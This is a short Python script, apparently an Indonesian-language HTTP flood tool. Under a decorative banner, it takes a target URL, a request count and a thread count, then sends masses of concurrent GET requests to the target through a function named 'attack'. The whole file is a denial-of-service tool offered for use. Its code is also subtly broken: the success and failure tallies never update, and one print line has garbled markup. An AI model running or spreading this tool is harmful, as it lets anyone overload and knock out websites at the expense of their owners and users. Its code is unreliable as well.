import asyncio
import aiohttp
from rich.console import Console

console = Console()

# Banner
console.print("©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©")
console.print("© ███╗   ███╗██╗   ██╗ ███████╗██╗   ©")
console.print("© ████╗ ████║╚██╗ ██╔╝ ██╔════╝██║   ©")
console.print("© ██╔████╔██║ ╚████╔╝  █████╗  ██║ ©")
console.print("© ██║╚██╔╝██║  ╚██╔╝   ██╔══╝  ██║ ©")
console.print("© ██║ ╚═╝ ██║   ██║    ███████╗███████╗©")
console.print("© ╚═╝     ╚═╝   ╚═╝    ╚══════╝╚══════╝ ©")
console.print("©       La Tahzan Innallah Ma’ana          ©")
console.print("©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©© [cyan]" )

async def attack(url, jumlah, threads):
    sukses = 0
    gagal = 0
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(jumlah):
            task = asyncio.create_task(send_request(session, url, i, sukses, gagal))
            tasks.append(task)
            if len(tasks) >= threads:
                await asyncio.gather(*tasks)
                tasks = []
        if tasks:
            await asyncio.gather(*tasks)
    console.print(f"[cyan]Total request: {jumlah}[/cyan]")
    console.print(f"[green]Sukses: {sukses}[/green]")
    console.print(f"[red]Gagal: {gagal}[/red: {gagal}[/red]")

async def send_request(session, url, i, sukses, gagal):
    try:
        async with session.get(url) as resp:
            console.print(f"[cyan]send request to {url}[/cyan]")
            console.print(f"[green]status: {resp.status}[/green]")
            sukses += 1
    except Exception as e:
        console.print(f"[red]ERROR {e}[/red]")
        gagal += 1

url = input("URL Target: ")
jumlah = int(input("Jumlah request: "))
threads = int(input("Jumlah threads: "))
asyncio.run(attack(url, jumlah, threads))
